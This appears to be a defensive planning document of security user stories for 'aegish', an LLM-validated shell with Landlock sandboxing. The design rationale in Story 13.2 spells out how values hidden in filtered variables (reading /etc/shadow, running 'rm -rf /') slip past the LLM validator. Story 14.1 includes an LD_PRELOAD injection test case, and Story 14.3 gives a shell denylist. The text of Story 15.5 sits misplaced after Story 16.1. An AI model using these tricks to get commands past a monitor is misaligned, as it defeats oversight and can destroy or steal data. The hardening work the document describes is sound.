**Goal:** Eliminate environment variable attack vectors in subprocess execution by switching to allowlist-based sanitization, hardening sensitive variable filters, and securing external binary invocation.

### Story 13.1: Switch Environment Sanitization to Allowlist

**Addresses:** CV-05 (Incomplete DANGEROUS_ENV_VARS Blocklist)
**Depends on:** `docs/stories/6-3-allowlist-environment-sanitization.md`

As a **security engineer**,
I want **subprocess environment sanitization to use an allowlist instead of a blocklist**,
So that **unknown or future dangerous environment variables are blocked by default**.

**Acceptance Criteria:**

**Given** `executor.py` currently uses `DANGEROUS_ENV_VARS` blocklist
**When** the allowlist is implemented
**Then** `_build_safe_env()` only passes through variables matching `ALLOWED_ENV_VARS` or `ALLOWED_ENV_PREFIXES`
**And** `DANGEROUS_ENV_VARS` is removed

**Given** a user runs a command inside aegish
**When** the subprocess environment is built
**Then** standard variables are preserved: `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `PWD`, `OLDPWD`, `SHLVL`, `TERM`, `COLORTERM`, `TERM_PROGRAM`, `LANG`, `LANGUAGE`, `TZ`, `TMPDIR`, `DISPLAY`, `WAYLAND_DISPLAY`, `SSH_AUTH_SOCK`, `SSH_AGENT_PID`, `GPG_AGENT_INFO`, `DBUS_SESSION_BUS_ADDRESS`, `HOSTNAME`

**Given** variables with safe prefixes exist (`LC_ALL`, `XDG_RUNTIME_DIR`, `AEGISH_MODE`)
**When** the subprocess environment is built
**Then** these variables are preserved

**Given** `LD_PRELOAD`, `BASH_ENV`, `SHELLOPTS`, `PS4`, `PYTHONPATH` are set
**When** a command is executed in aegish
**Then** none of these appear in the subprocess environment

**Tasks:**
- [ ] Replace blocklist with allowlist in `executor.py` per Story 6.3 spec
- [ ] Remove `DANGEROUS_ENV_VARS`
- [ ] Add `ALLOWED_ENV_VARS` set and `ALLOWED_ENV_PREFIXES` tuple
- [ ] Rewrite `_build_safe_env()` to only pass through allowlisted variables
- [ ] Update tests in `tests/test_executor.py`

**Files:** `src/aegish/executor.py`, `tests/test_executor.py`

---

### Story 13.2: Remove Sensitive Variable Filter (Default: Full Expansion to LLM)

**Addresses:** CV-10 (Incomplete Sensitive Variable Filter)
**Supersedes:** Previous approach of hardening the filter

As a **security engineer**,
I want **all environment variable values to be expanded and shown to the LLM by default**,
So that **the LLM has full visibility into what commands will actually do, and attackers cannot hide dangerous payloads inside filtered variables**.

**Design rationale:** The sensitive variable filter (`_SENSITIVE_VAR_PATTERNS`) creates an unacceptable evasion vector. An attacker can store dangerous values in filtered variables and the LLM cannot see them:
- `API_KEY="/etc/shadow"; cat $API_KEY` — filter hides the value, LLM sees `cat $API_KEY` (looks harmless), actual execution reads `/etc/shadow`
- `SECRET_KEY="rm -rf /"; eval $SECRET_KEY` — static checks catch `eval`, but `cat`, `curl`, `scp`, and hundreds of other commands in argument position are not covered

**Security tradeoff:** Showing variable values to the LLM means credentials may be sent to the LLM API. This is acceptable because:
1. The user already trusts the LLM provider with their command text
2. Security visibility (preventing attacks) outweighs credential privacy from the LLM provider
3. Users who prioritize credential privacy can opt-in to filtering

**Acceptance Criteria:**

**Given** `DATABASE_URL=postgres://admin:secret@db/app` is set and aegish uses default config
**When** the command `cat $DATABASE_URL` is validated
**Then** the LLM sees the expanded value (`cat postgres://admin:secret@db/app`)
**And** the LLM can judge whether the resolved command is dangerous

**Given** `API_KEY="/etc/shadow"` is set
**When** the command `cat $API_KEY` is validated
**Then** the LLM sees `cat /etc/shadow` (expanded) and can block it

**Given** `AEGISH_FILTER_SENSITIVE_VARS=true` is configured (opt-in)
**When** any command referencing `$DATABASE_URL` is validated
**Then** the variable value is NOT expanded (legacy behavior for credential privacy)
**And** a warning is logged at startup: "Sensitive variable filtering is enabled. This reduces LLM visibility and may create security blind spots."

**Given** `AEGISH_FILTER_SENSITIVE_VARS` is not set (default)
**When** any command is validated
**Then** all variables are expanded — no filtering applied

**Tasks:**
- [ ] Remove `_SENSITIVE_VAR_PATTERNS` filtering from the default code path in `llm_client.py`
- [ ] Add `AEGISH_FILTER_SENSITIVE_VARS` config option (default: `false`)
- [ ] When filtering is opt-in enabled: preserve the existing pattern-based filter with improved patterns (`_PASS`, `_KEY`, `_AUTH`, `_DSN`, `_WEBHOOK`, `_SID`, `_PAT`, `KUBECONFIG`, `CREDENTIALS`, `_SIGNING`, `PGPASSWORD`, `MYSQL_PWD`)
- [ ] Log a startup warning when filtering is enabled, documenting the security tradeoff
- [ ] Update tests: default behavior expands all vars; opt-in filtering works when enabled

**Files:** `src/aegish/llm_client.py`, `src/aegish/config.py`, `tests/test_llm_client.py`

---

### Story 13.3: Use Absolute Path for envsubst

**Addresses:** CV-26 (envsubst Invoked Without Absolute Path)

As a **security engineer**,
I want **envsubst to be invoked via absolute path or resolved at startup**,
So that **a malicious `envsubst` binary earlier in PATH cannot intercept command text**.

**Acceptance Criteria:**

**Given** envsubst is available at `/usr/bin/envsubst`
**When** aegish starts
**Then** the absolute path is resolved once and used for all invocations

**Given** envsubst is not found on the system
**When** aegish starts
**Then** a warning is logged and env var expansion is disabled (not a crash)

**Tasks:**
- [ ] Resolve envsubst path once at startup using `shutil.which("envsubst")`
- [ ] Store resolved path in module-level variable
- [ ] Use resolved path in all `subprocess.run()` calls for envsubst
- [ ] Handle missing envsubst gracefully
- [ ] Add test for path resolution

**Files:** `src/aegish/llm_client.py`, `tests/test_llm_client.py`

---

### Story 13.4: Hardcode Runner Path and Verify Binary Integrity

**Addresses:** CV-08 (Runner Binary Path Poisoning via AEGISH_RUNNER_PATH)

As a **security engineer**,
I want **the runner binary path to be hardcoded in production mode and the binary verified via SHA-256 hash at startup**,
So that **an attacker cannot redirect to a malicious binary or tamper with the runner**.

**Design rationale:** `AEGISH_RUNNER_PATH` being configurable IS the attack vector — there is no legitimate reason for a monitored user to change where the runner binary lives. In production, hardcode it. Integrity verification via SHA-256 catches tampering that path validation alone cannot (e.g., replacing the binary contents at the correct path).

**Acceptance Criteria:**

**Given** aegish is running in production mode
**When** the runner binary path is determined
**Then** it is always `/opt/aegish/bin/runner` (hardcoded)
**And** `AEGISH_RUNNER_PATH` from the environment is completely ignored

**Given** the runner binary at `/opt/aegish/bin/runner` exists
**When** aegish starts in production mode
**Then** it computes the SHA-256 hash of the binary
**And** verifies it against the expected hash embedded at build time
**And** if the hash matches, proceeds normally

**Given** the runner binary has been tampered with (hash mismatch)
**When** aegish starts in production mode
**Then** it refuses to start with error: "Runner binary integrity check failed. Expected SHA-256: {expected}, got: {actual}"

**Given** the runner binary does not exist at the hardcoded path
**When** aegish starts in production mode
**Then** it refuses to start with error: "Runner binary not found at /opt/aegish/bin/runner"

**Given** aegish is running in development mode
**When** `AEGISH_RUNNER_PATH` is set
**Then** existing behavior is preserved (development mode allows flexibility, no hash check)

**Tasks:**
- [ ] In production mode, hardcode runner path to `/opt/aegish/bin/runner` — ignore `AEGISH_RUNNER_PATH` env var
- [ ] Compute SHA-256 hash of the runner binary at startup
- [ ] Embed expected hash at build time (in `Dockerfile.production` or a build-generated constants file)
- [ ] Refuse to start on hash mismatch or missing binary
- [ ] In development mode, preserve `AEGISH_RUNNER_PATH` configurability (no hash check)
- [ ] Add tests for: hash match, hash mismatch, missing binary, env var ignored in production

**Files:** `src/aegish/config.py`, `Dockerfile.production`, `tests/test_config.py`

---

## Epic 14: Production Infrastructure & Shell State

**Goal:** Strengthen the production sandbox, add shell state persistence for usability, and fix system-level security issues in the Landlock implementation.

### Story 14.1: Shell State Persistence Across Commands

**Depends on:** `docs/shell-state-persistence.md`

As a **shell user**,
I want **my working directory, exported environment variables, and exit code to persist across commands**,
So that **aegish behaves like a normal interactive shell where `cd /tmp` affects the next command**.

**Acceptance Criteria:**

**Given** a user runs `cd /tmp` followed by `pwd`
**When** both commands complete
**Then** `pwd` outputs `/tmp`

**Given** a user runs `export FOO=bar` followed by `echo $FOO`
**When** both commands complete
**Then** `echo $FOO` outputs `bar`

**Given** a user runs `false` followed by `echo $?`
**When** both commands complete
**Then** `echo $?` outputs `1`

**Given** a user runs `export LD_PRELOAD=/tmp/evil.so`
**When** the environment is captured after the command
**Then** `LD_PRELOAD` is stripped by environment sanitization

**Given** a bare `cd /path` command
**When** it is processed
**Then** it is intercepted in Python without spawning a subprocess (fast path)

**Tasks:**
- [ ] Implement pipe-based environment capture per shell-state-persistence.md spec
- [ ] Track `current_dir` and `previous_dir` in Python
- [ ] Intercept bare `cd` commands as fast path
- [ ] Sanitize captured env on every cycle via `sanitize_env()`
- [ ] Preserve `$?` (exit code) across commands using `(exit N)` prefix
- [ ] Integrate with Landlock `pass_fds`
- [ ] Add comprehensive tests

**Files:** `src/aegish/executor.py`, `src/aegish/shell.py`, `tests/test_executor.py`, `tests/test_shell.py`

---

### Story 14.2: Landlock Dropper Implementation

**Depends on:** `docs/landlock-dropper-implementation.md`

As a **security engineer**,
I want **a Landlock dropper that prevents the runner binary from being executed as an interactive shell**,
So that **users cannot bypass aegish by directly executing the runner binary**.

**Acceptance Criteria:**

**Given** a user attempts to execute `/opt/aegish/bin/runner` directly
**When** the Landlock sandbox is active
**Then** the kernel returns EPERM and the execution is blocked

**Given** a path variant like `/opt/aegish/bin/../bin/runner`
**When** the execution is attempted
**Then** realpath resolves the path and it is still blocked

**Given** `true && /opt/aegish/bin/runner` (compound command)
**When** the sandbox is active
**Then** the runner execution within the compound command is blocked

**Given** normal binaries like `/usr/bin/ls`
**When** the sandbox is active
**Then** they execute normally

**Tasks:**
- [ ] Create `src/sandboxer/landlock_sandboxer.c` per spec
- [ ] Modify `executor.py` to inject `LD_PRELOAD` pointing to sandboxer
- [ ] Update `Dockerfile.production` to compile sandboxer
- [ ] Add tests for runner blocking and normal binary allowance
- [ ] Verify compatibility with shell state persistence `pass_fds`

**Files:** `src/sandboxer/landlock_sandboxer.c`, `src/aegish/executor.py`, `src/aegish/sandbox.py`, `Dockerfile.production`, `tests/test_executor.py`

---

### Story 14.3: Complete DENIED_SHELLS List

**Addresses:** CV-23 (Incomplete DENIED_SHELLS in Landlock Sandbox)

As a **security engineer**,
I want **the DENIED_SHELLS list to include all common shell binaries**,
So that **shells like ash, busybox, mksh, and others cannot be used to bypass aegish**.

**Acceptance Criteria:**

**Given** the DENIED_SHELLS list
**When** it is reviewed
**Then** it includes: `bash`, `sh`, `zsh`, `fish`, `dash`, `csh`, `tcsh`, `ksh`, `ash`, `busybox`, `mksh`, `rbash`, `elvish`, `nu`, `pwsh`, `xonsh`

**Given** a user tries to execute any shell in DENIED_SHELLS
**When** Landlock is active
**Then** the execution is blocked with EPERM

**Tasks:**
- [ ] Add missing shells to `DENIED_SHELLS` in `sandbox.py`: `ash`, `busybox`, `mksh`, `rbash`, `elvish`, `nu`, `pwsh`, `xonsh`
- [ ] Document the known limitation: copy/rename bypasses path-based denylist
- [ ] Add tests for newly added shells

**Files:** `src/aegish/sandbox.py`, `tests/test_executor.py`

---

### Story 14.4: Fix ctypes Return Type for syscall()

**Addresses:** CV-38 (ctypes Return Type Mismatch for syscall())

As a **developer**,
I want **the ctypes syscall wrapper to use the correct `c_long` return type**,
So that **64-bit return values are not truncated and errno is properly checked**.

**Acceptance Criteria:**

**Given** the Landlock syscall wrapper
**When** `libc.syscall` is configured
**Then** `restype` is set to `ctypes.c_long` (not default `c_int`)

**Given** a syscall fails
**When** the error is reported
**Then** `ctypes.get_errno()` is called and included in the error message

**Tasks:**
- [ ] Set `libc.syscall.restype = ctypes.c_long` in `sandbox.py`
- [ ] Add `ctypes.get_errno()` call on syscall failures
- [ ] Add test verifying correct return type configuration

**Files:** `src/aegish/sandbox.py`, `tests/test_executor.py`

---

## Epic 15: Audit Trail & Project Hygiene

**Goal:** Add observability through persistent audit logging and clean up dependency, build, and configuration issues.

### Story 15.1: Add Persistent Structured Audit Logging

**Addresses:** CV-14 (No Audit Trail or Persistent Logging)

As a **security administrator**,
I want **all validation decisions to be logged to a tamper-proof, root-owned audit trail with full command text**,
So that **post-incident forensics can determine exactly which commands were submitted, what the LLM decided, and which warnings were overridden — and the monitored user cannot alter the evidence**.

**Acceptance Criteria:**

**Given** a command is validated (any action: allow, warn, block)
**When** the validation completes
**Then** a JSON log entry is appended to `/var/log/aegish/audit.log` containing:
  - `timestamp` (ISO 8601)
  - `command` (the full command text — not a hash)
  - `user` (the username running the command)
  - `action` (allow/warn/block)
  - `confidence`
  - `model` (which model made the decision)
  - `source` (llm, static_blocklist, variable_check, etc.)

**Given** the user overrides a WARN
**When** the override is confirmed
**Then** a second log entry records the override with `action: warn_overridden`

**Given** `/var/log/aegish/` exists
**When** its ownership and permissions are checked
**Then** it is owned by `root:root` with mode `0o750`
**And** the monitored user cannot write to, truncate, or delete audit log files

**Given** `/var/log/aegish/` does not exist or is not writable
**When** aegish starts in production mode
**Then** it logs a WARNING to stderr that audit logging is unavailable
**And** continues operating (audit failure does not block command validation)

**Given** aegish is running in development mode
**When** `/var/log/aegish/` is not available
**Then** audit logs fall back to `~/.aegish/audit.log` (user-owned, best-effort)

**Tasks:**
- [ ] In production mode: log to `/var/log/aegish/audit.log` (root-owned directory, created by package installer or Dockerfile)
- [ ] In development mode: fall back to `~/.aegish/audit.log` if `/var/log/aegish/` is not writable
- [ ] Log the full command text (not a hash) — the log is root-owned so the user cannot read other users' commands, and forensics requires the actual command
- [ ] Add JSON file handler to Python logging for audit events
- [ ] Log all validation decisions with structured fields including username
- [ ] Log WARN overrides as separate events
- [ ] Open log file in append-only mode; do not fail if the directory is missing (warn and continue)
- [ ] Update `Dockerfile.production` to create `/var/log/aegish/` with correct ownership
- [ ] Add tests for audit log creation, content, and fallback behavior

**Files:** `src/aegish/shell.py`, `src/aegish/validator.py`, `Dockerfile.production`, `tests/test_shell.py`

---

### Story 15.2: Pin litellm Version Ceiling

**Addresses:** CV-31 (litellm Dependency Has No Version Ceiling)

As a **developer**,
I want **the litellm dependency to have a version ceiling**,
So that **untested major version bumps with potential CVEs are not automatically pulled in**.

**Acceptance Criteria:**

**Given** `pyproject.toml`
**When** the litellm dependency is checked
**Then** it specifies `litellm>=1.81.0,<2.0.0`

**Tasks:**
- [ ] Update litellm dependency in `pyproject.toml` to `>=1.81.0,<2.0.0`

**Files:** `pyproject.toml`

---

### Story 15.3: Move adjusttext to Dev Dependencies

**Addresses:** CV-32 (adjusttext in Runtime Dependencies)

As a **developer**,
I want **adjusttext (matplotlib/scipy helper) to be in dev dependencies, not runtime**,
So that **production installs don't pull in ~100 MB of visualization libraries**.

**Acceptance Criteria:**

**Given** `pyproject.toml`
**When** the dependencies are checked
**Then** `adjusttext` is in `[dependency-groups] dev` or `[project.optional-dependencies] dev`, NOT in `[project.dependencies]`

**Tasks:**
- [ ] Move `adjusttext` from `[project.dependencies]` to dev dependency group
- [ ] Verify no production imports reference adjusttext

**Files:** `pyproject.toml`

---

### Story 15.4: Compute Benchmark Metadata Counts Dynamically

**Addresses:** CV-33 (Benchmark Hardcoded Metadata Counts Mismatch)

As a **developer**,
I want **benchmark metadata counts to be computed dynamically from actual dataset files**,
So that **the counts stay accurate as datasets are updated**.

**Acceptance Criteria:**

**Given** `compare.py` currently hardcodes `gtfobins_count: 431, harmless_count: 310`
**When** the metadata is generated
**Then** counts are computed from the actual dataset files at runtime

**Given** the dataset files contain 676 GTFOBins and 496 harmless commands
**When** the metadata is generated
**Then** counts reflect 676 and 496

**Tasks:**
- [ ] Replace hardcoded counts in `compare.py` with dynamic computation
- [ ] Read actual dataset files to count entries
- [ ] Add test verifying counts match actual files

**Files:** `benchmark/compare.py`, `tests/test_benchmark_compare.py`

---

### Story 15.5: Update Stale .gitignore and .env.example

---

## Epic 16: Sudo Post-Elevation Sandboxing

**Goal:** Enable sysadmin users in production mode to run `sudo` commands while maintaining Landlock sandboxing after privilege elevation.

### Story 16.1: Sudo Post-Elevation Sandboxing

**Addresses:** DD-19 (Post-elevation Landlock for sudo commands)
**Depends on:** Story 14.2 (Landlock Dropper Implementation), Story 12.4 (Role-Based Trust Levels)

As a **sysadmin user in production mode**,
I want **to run `sudo` commands that are validated by the LLM**,
So that **I can perform privileged operations while shell escapes are still blocked by Landlock even as root**.

**Acceptance Criteria:**

**Given** `AEGISH_ROLE=sysadmin` and `AEGISH_MODE=production`
**When** a `sudo whoami` command is executed
**Then** the command runs as root and outputs `root`
**And** Landlock blocks shell escapes (bash, sh) even as root

**Given** `AEGISH_ROLE=default` and `AEGISH_MODE=production`
**When** a `sudo ls` command is executed
**Then** the sudo path is NOT used (delegation does not occur)

**Given** `AEGISH_MODE=development`
**When** a `sudo ls` command is executed
**Then** the sudo path is NOT used (normal execution)

**Given** the sandboxer library is missing
**When** a sysadmin runs `sudo ls` in production
**Then** the command falls back to running `ls` without sudo (fail-safe)

**Known Limitation (v1):** Only `sudo <command>` is supported. Sudo flags like `-u`, `-E`, `-i` are not supported through this path.

**Tasks:**
- [x] Add `prctl(PR_SET_NO_NEW_PRIVS)` to the C sandboxer library constructor (idempotent)
- [x] Add `_is_sudo_command()`, `_strip_sudo_prefix()`, `_validate_sudo_binary()` helpers in `executor.py`
- [x] Add `_execute_sudo_sandboxed()` function that builds the sudo + LD_PRELOAD command
- [x] Add delegation check at the top of `execute_command()` for production + sysadmin + sudo
- [x] Add sudo to Dockerfile and sudoers entry for testuser
- [x] Add unit tests (~28 tests) for sudo detection, stripping, validation, execution, delegation
- [x] Add Docker integration tests for sudo + Landlock sandboxing

**Files:** `src/sandboxer/landlock_sandboxer.c`, `src/aegish/executor.py`, `tests/Dockerfile.production`, `tests/test_executor.py`, `tests/test_production_mode.py`

**Addresses:** CV-44 (Stale .gitignore and .env.example References)

As a **developer**,
I want **.gitignore and .env.example to reflect the current project structure**,
So that **build artifacts are properly ignored and the example env matches available providers**.

**Acceptance Criteria:**

**Given** `.gitignore`
**When** it is reviewed
**Then** `src/secbash/` references are updated to `src/aegish/`
**And** `.mypy_cache/` and `.ruff_cache/` patterns are added

**Given** `.env.example`
**When** it is reviewed
**Then** provider references match `DEFAULT_ALLOWED_PROVIDERS` (no stale `openrouter` reference)
**And** new model defaults are documented

**Tasks:**
- [ ] Update `.gitignore`: replace `secbash` with `aegish`, add missing cache patterns
- [ ] Update `.env.example`: align with current providers and defaults
- [ ] Verify no other stale references exist

**Files:** `.gitignore`, `.env.example`
